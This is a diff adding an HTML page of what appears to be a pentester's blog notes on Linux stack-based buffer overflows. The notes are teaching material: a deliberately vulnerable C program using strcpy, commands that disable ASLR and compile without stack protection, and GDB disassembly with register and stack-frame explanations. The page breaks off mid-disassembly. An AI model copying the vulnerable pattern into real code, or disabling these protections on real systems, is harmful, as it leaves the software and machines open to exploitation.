@@ -1,0 +1,847 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Notes Stack-Based Buffer Overflow - Linux" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Fundamentals" /><meta property="og:description" content="Fundamentals" /><link rel="canonical" href="zeropio.github.io/notes/vulnerabilities/buffer-overflow-linux" /><meta property="og:url" content="zeropio.github.io/notes/vulnerabilities/buffer-overflow-linux" /><meta property="og:site_name" content="Zeropio’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-21T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Stack-Based Buffer Overflow - Linux" /><meta name="twitter:site" content="@ZeropioWasTaken" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-07-21T19:11:53+02:00","datePublished":"2022-07-21T00:00:00+02:00","description":"Fundamentals","headline":"Notes Stack-Based Buffer Overflow - Linux","mainEntityOfPage":{"@type":"WebPage","@id":"zeropio.github.io/notes/vulnerabilities/buffer-overflow-linux"},"url":"zeropio.github.io/notes/vulnerabilities/buffer-overflow-linux"}</script><title>Notes | Stack-Based Buffer Overflow - Linux | Zeropio's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Zeropio's Blog"><meta name="application-name" content="Zeropio's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Zeropio's Blog</a></div><div class="site-subtitle font-italic">CTF enjoyer and pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-lightbulb-o ml-xl-3 mr-xl-3 unloaded"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zeropio" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/ZeropioWasTaken" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Stack-Based Buffer Overflow - Linux</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Stack-Based Buffer Overflow - Linux</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1658354400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 21, 2022 </em> </span> <span> Updated <em class="" data-ts="1658423513" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 21, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> zeropio </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4577 words"> <em>25 min</em> read</span></div></div></div><div class="post-content"><h1 id="fundamentals">Fundamentals</h1><p>Memory exceptions are the operating system’s reaction to an error in existing software or during the execution of these. Programming errors often occur, leading to buffer overflows due to inattention when programming with low abstract languages such as C or C++. <strong>Buffer overflows</strong> are errors that allow data that is too large to fit into a buffer of the operating system’s memory that is not large enough, thereby overflowing this buffer. As a result of this mishandling, the memory of other functions of the executed program is overwritten, potentially creating a security vulnerability.</p><p>Such a program (binary file), is a general executable file stored on a data storage medium. There are several different file formats for such executable binary files. For example, the Portable Executable Format (PE) is used on Microsoft platforms. Another format for executable files is the Executable and Linking Format (ELF), supported by almost all modern UNIX variants. If the linker loads such an executable binary file and the program will be executed, the corresponding program code will be loaded into the main memory and then executed by the CPU.</p><h2 id="vulnerable-program"><span class="mr-2">Vulnerable Program</span><a href="#vulnerable-program" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This program called <code class="language-plaintext highlighter-rouge">bow.c</code> is a vulnerable example:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">bowfunc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span> <span class="p">{</span>
+
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+	<span class="n">bowfunc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Done.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Where <code class="language-plaintext highlighter-rouge">strcpy()</code> is a vulnerable function. Modern OS have protection against this (like <strong>Address Space Layout Randomizaion</strong>, ASLR). To disable ASLR:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span>su 
+<span class="gp">root@pio$</span><span class="w"> </span><span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/randomize_va_space
+<span class="gp">root@pio$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
+<span class="go">
+0
+</span></pre></table></code></div></div><p>Next compile the code into a <em>32bit ELF binary</em>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>gcc bow.c <span class="nt">-o</span> bow32 <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-m32</span>
+<span class="gp">zero@pio$</span><span class="w"> </span>file bow32 | <span class="nb">tr</span> <span class="s2">","</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<span class="go">
+bow: ELF 32-bit LSB shared object
+ Intel 80386
+ version 1 (SYSV)
+ dynamically linked
+ interpreter /lib/ld-linux.so.2
+ for GNU/Linux 3.2.0
+ BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
+ not stripped
+</span></pre></table></code></div></div><p>There are some vulnerable functions in C, for example:</p><ul><li><code class="language-plaintext highlighter-rouge">strcpy</code><li><code class="language-plaintext highlighter-rouge">gets</code><li><code class="language-plaintext highlighter-rouge">sprintf</code><li><code class="language-plaintext highlighter-rouge">scanf</code><li><code class="language-plaintext highlighter-rouge">strcat</code></ul><h2 id="gdb"><span class="mr-2">GDB</span><a href="#gdb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>GDB is the <strong>GNU Debugger</strong>, standard debugger for Unix Systems. It can work with many language as C, C++, Objective-C, FORTRAN, Java… We use GDB to view the created binary on the assembler level. Once we have executed the binary with GDB, we can disassemble the program’s main function.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>zero@pio$ gdb -q bow32
+
+Reading symbols from bow...(no debugging symbols found)...done.
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+   0x00000582 &lt;+0&gt;: 	lea    0x4(%esp),%ecx
+   0x00000586 &lt;+4&gt;: 	and    $0xfffffff0,%esp
+   0x00000589 &lt;+7&gt;: 	pushl  -0x4(%ecx)
+   0x0000058c &lt;+10&gt;:	push   %ebp
+   0x0000058d &lt;+11&gt;:	mov    %esp,%ebp
+   0x0000058f &lt;+13&gt;:	push   %ebx
+   0x00000590 &lt;+14&gt;:	push   %ecx
+   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x00000596 &lt;+20&gt;:	add    $0x1a3e,%ebx
+   0x0000059c &lt;+26&gt;:	mov    %ecx,%eax
+   0x0000059e &lt;+28&gt;:	mov    0x4(%eax),%eax
+   0x000005a1 &lt;+31&gt;:	add    $0x4,%eax
+   0x000005a4 &lt;+34&gt;:	mov    (%eax),%eax
+   0x000005a6 &lt;+36&gt;:	sub    $0xc,%esp
+   0x000005a9 &lt;+39&gt;:	push   %eax
+   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;
+   0x000005af &lt;+45&gt;:	add    $0x10,%esp
+   0x000005b2 &lt;+48&gt;:	sub    $0xc,%esp
+   0x000005b5 &lt;+51&gt;:	lea    -0x1974(%ebx),%eax
+   0x000005bb &lt;+57&gt;:	push   %eax
+   0x000005bc &lt;+58&gt;:	call   0x3e0 &lt;puts@plt&gt;
+   0x000005c1 &lt;+63&gt;:	add    $0x10,%esp
+   0x000005c4 &lt;+66&gt;:	mov    $0x1,%eax
+   0x000005c9 &lt;+71&gt;:	lea    -0x8(%ebp),%esp
+   0x000005cc &lt;+74&gt;:	pop    %ecx
+   0x000005cd &lt;+75&gt;:	pop    %ebx
+   0x000005ce &lt;+76&gt;:	pop    %ebp
+   0x000005cf &lt;+77&gt;:	lea    -0x4(%ecx),%esp
+   0x000005d2 &lt;+80&gt;:	ret    
+End of assembler dump.
+</pre></table></code></div></div><p>The firt column represent the <strong>memory address</strong> (in hexadecimal). The numbers with the plus (+) represent the <strong>address jump</strong> in memory bytes. Next the <strong>assembler instructions</strong> (<strong>mnemonics</strong>), with <strong>registers</strong> and their <strong>operation suffixes</strong>. The current syntax is <strong>AT&amp;T</strong>, which we can recognize by the <code class="language-plaintext highlighter-rouge">%</code> and <code class="language-plaintext highlighter-rouge">$</code> characters.</p><div class="table-wrapper"><table><thead><tr><th><strong>Memory Address</strong><th><strong>Address Jump</strong><th><strong>Assembler Instruction</strong><th><strong>Operation Suffixes</strong><tbody><tr><td>0x00000582<td>&lt;+0&gt;:<td>lea<td>0x4(%esp),%ecx<tr><td>0x00000586<td>&lt;+4&gt;:<td>and<td>$0xfffffff0,%esp<tr><td>…<td>…<td>…<td>…</table></div><p>The <strong>Intel</strong> syntax is easier to read:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+   0x00000582 &lt;+0&gt;:	lea    ecx,[esp+0x4]
+   0x00000586 &lt;+4&gt;:	and    esp,0xfffffff0
+   0x00000589 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
+   0x0000058c &lt;+10&gt;:	push   ebp
+   0x0000058d &lt;+11&gt;:	mov    ebp,esp
+   0x0000058f &lt;+13&gt;:	push   ebx
+   0x00000590 &lt;+14&gt;:	push   ecx
+   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e
+   0x0000059c &lt;+26&gt;:	mov    eax,ecx
+   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]
+</pre></table></code></div></div><p>We can change the GDB syntax:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'set disassembly-flavor intel'</span> <span class="o">&gt;</span> ~/.gdbinit
+</pre></table></code></div></div><p>And now:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>zero@pio$ gdb ./bow32 -q
+
+Reading symbols from bow...(no debugging symbols found)...done.
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+   0x00000582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]
+   0x00000586 &lt;+4&gt;: 	and    esp,0xfffffff0
+   0x00000589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]
+   0x0000058c &lt;+10&gt;:	push   ebp
+   0x0000058d &lt;+11&gt;:	mov    ebp,esp
+   0x0000058f &lt;+13&gt;:	push   ebx
+   0x00000590 &lt;+14&gt;:	push   ecx
+   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e
+   0x0000059c &lt;+26&gt;:	mov    eax,ecx
+   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]
+   0x000005a1 &lt;+31&gt;:	add    eax,0x4
+   0x000005a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]
+   0x000005a6 &lt;+36&gt;:	sub    esp,0xc
+   0x000005a9 &lt;+39&gt;:	push   eax
+   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;
+   0x000005af &lt;+45&gt;:	add    esp,0x10
+   0x000005b2 &lt;+48&gt;:	sub    esp,0xc
+   0x000005b5 &lt;+51&gt;:	lea    eax,[ebx-0x1974]
+   0x000005bb &lt;+57&gt;:	push   eax
+   0x000005bc &lt;+58&gt;:	call   0x3e0 &lt;puts@plt&gt;
+   0x000005c1 &lt;+63&gt;:	add    esp,0x10
+   0x000005c4 &lt;+66&gt;:	mov    eax,0x1
+   0x000005c9 &lt;+71&gt;:	lea    esp,[ebp-0x8]
+   0x000005cc &lt;+74&gt;:	pop    ecx
+   0x000005cd &lt;+75&gt;:	pop    ebx
+   0x000005ce &lt;+76&gt;:	pop    ebp
+   0x000005cf &lt;+77&gt;:	lea    esp,[ecx-0x4]
+   0x000005d2 &lt;+80&gt;:	ret    
+End of assembler dump.
+</pre></table></code></div></div><p>The difference between the AT&amp;T and Intel syntax is not only in the presentation of the instructions with their symbols but also in the order and direction in which the instructions are executed and read. With the following example:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>   0x0000058d &lt;+11&gt;:	mov    ebp,esp
+</pre></table></code></div></div><ul><li><strong>Intel Syntax</strong></ul><div class="table-wrapper"><table><thead><tr><th><strong>Instruction</strong><th><strong>Destination</strong><th><strong>Source</strong><tbody><tr><td>mov<td>ebp<td>esp</table></div><ul><li><strong>AT&amp;T Syntax</strong></ul><div class="table-wrapper"><table><thead><tr><th><strong>Instruction</strong><th><strong>Source</strong><th><strong>Destination</strong><tbody><tr><td>mov<td>%esp<td>%ebp</table></div><h2 id="cpu-registers"><span class="mr-2">CPU Registers</span><a href="#cpu-registers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. Can be divided in <em>General registers</em>, <em>Control registers</em> and <em>Segment registers</em>. The most critical registers we need are the General registers. In these, there are further subdivisions into <em>Data registers</em>, <em>Pointer registers</em>, and <em>Index registers</em>.</p><ul><li><strong>Data registers</strong></ul><div class="table-wrapper"><table><thead><tr><th><strong>32-bit Register</strong><th><strong>64-bit Register</strong><th><strong>Description</strong><tbody><tr><td>EAX<td>RAX<td>Accumulator is used in input/output and for arithmetic operations<tr><td>EBX<td>RBX<td>Base is used in indexed addressing<tr><td>ECX<td>RCX<td>Counter is used to rotate instructions and count loops<tr><td>EDX<td>RDX<td>Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values</table></div><ul><li><strong>Pointer registers</strong></ul><div class="table-wrapper"><table><thead><tr><th><strong>32-bit Register</strong><th><strong>64-bit Register</strong><th><strong>Description</strong><tbody><tr><td>EIP<td>RIP<td>Instruction Pointer stores the offset address of the next instruction to be executed<tr><td>ESP<td>RSP<td>Stack Pointer points to the top of the stack<tr><td>EBP<td>RBP<td>Base Pointer is also known as <strong>Stack Base Pointer</strong> or <strong>Frame Pointer</strong> thats points to the base of the stack</table></div><h3 id="stack-frames"><span class="mr-2">Stack Frames</span><a href="#stack-frames" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since the stack starts with a high address and grows down to low memory addresses as values are added, the <strong>Base Pointer</strong> points to the beginning (base) of the stack in contrast to the <strong>Stack Pointer</strong>, which points to the top of the stack. As the stack grows, it is logically divided into regions called Stack Frames, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (<strong>EBP</strong>) and the end (<strong>ESP</strong>) that is pushed onto the stack when a function is called.</p><p>Since the stack memory is built on a Last-In-First-Out (<strong>LIFO</strong>) data structure, the first step is to store the previous <strong>EBP</strong> position on the stack, which can be restored after the function completes. If we now look at the bowfunc function, it looks like following in GDB:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>(gdb) disas bowfunc 
+
+Dump of assembler code for function bowfunc:
+   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP
+   0x0000054e &lt;+1&gt;:	    mov    ebp,esp
+   0x00000550 &lt;+3&gt;:	    push   ebx
+   0x00000551 &lt;+4&gt;:	    sub    esp,0x404
+   &lt;...SNIP...&gt;
+   0x00000580 &lt;+51&gt;:	leave  
+   0x00000581 &lt;+52&gt;:	ret    
+</pre></table></code></div></div><p>The <strong>EBP</strong> in the stack frame is set first when a function is called and contains the <strong>EBP</strong> of the previous stack frame. Next, the value of the <strong>ESP</strong> is copied to the <strong>EBP</strong>, creating a new stack frame.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>(gdb) disas bowfunc 
+
+Dump of assembler code for function bowfunc:
+   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP
+   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame
+   0x00000550 &lt;+3&gt;:	    push   ebx
+   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 
+   &lt;...SNIP...&gt;
+   0x00000580 &lt;+51&gt;:	leave  
+   0x00000581 &lt;+52&gt;:	ret
+</pre></table></code></div></div><p>Then some space is created in the stack, moving the <strong>ESP</strong> to the top for the operations and variables needed and processed.</p><p>These three functions are called <strong>Prologue</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>(gdb) disas bowfunc 
+
+Dump of assembler code for function bowfunc:
+   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP
+   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame
+   0x00000550 &lt;+3&gt;:	    push   ebx
+   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 # &lt;---- 3. Moves ESP to the top
+   &lt;...SNIP...&gt;
+   0x00000580 &lt;+51&gt;:	leave  
+   0x00000581 &lt;+52&gt;:	ret
+</pre></table></code></div></div><p>For getting out of the stack frame, the opposite is done, the <strong>Epilogue</strong>. During the epilogue, the <strong>ESP</strong> is replaced by the current <strong>EBP</strong>, and its value is reset to the value it had before in the prologue.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>(gdb) disas bowfunc 
+
+Dump of assembler code for function bowfunc:
+   0x0000054d &lt;+0&gt;:	    push   ebp       
+   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   
+   0x00000550 &lt;+3&gt;:	    push   ebx
+   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 
+   &lt;...SNIP...&gt;
+   0x00000580 &lt;+51&gt;:	leave  # &lt;----------------------
+   0x00000581 &lt;+52&gt;:	ret    # &lt;--- Leave stack frame
+</pre></table></code></div></div><p>Another important point concerning the representation of the assembler is the naming of the registers. This depends on the format in which the binary was compiled.</p><div class="table-wrapper"><table><thead><tr><th><strong>Register 32-bit</strong><th><strong>Register 64-bit</strong><th><strong>Description</strong><tbody><tr><td>ESI<td>RSI<td>Source Index is used as a pointer from a source for string operations<tr><td>EDI<td>RDI<td>Destination is used as a pointer to a destination for string operations</table></div><p>We have used GCC to compile the bow.c code in 32-bit format. Now let’s compile the same code into a 64-bit format.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>gcc bow.c <span class="nt">-o</span> bow64 <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-m64</span>
+<span class="gp">zero@pio$</span><span class="w"> </span>file bow64 | <span class="nb">tr</span> <span class="s2">","</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<span class="go">
+bow64: ELF 64-bit LSB shared object
+ x86-64
+ version 1 (SYSV)
+ dynamically linked
+ interpreter /lib64/ld-linux-x86-64.so.2
+ for GNU/Linux 3.2.0
+ BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99
+ not stripped
+</span></pre></table></code></div></div><p>Looking at the assembler code:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>zero@pio$ gdb -q bow64
+
+Reading symbols from bow64...(no debugging symbols found)...done.
+(gdb) disas main
+
+Dump of assembler code for function main:
+   0x00000000000006bc &lt;+0&gt;: 	push   rbp
+   0x00000000000006bd &lt;+1&gt;: 	mov    rbp,rsp
+   0x00000000000006c0 &lt;+4&gt;: 	sub    rsp,0x10
+   0x00000000000006c4 &lt;+8&gt;:  	mov    DWORD PTR [rbp-0x4],edi
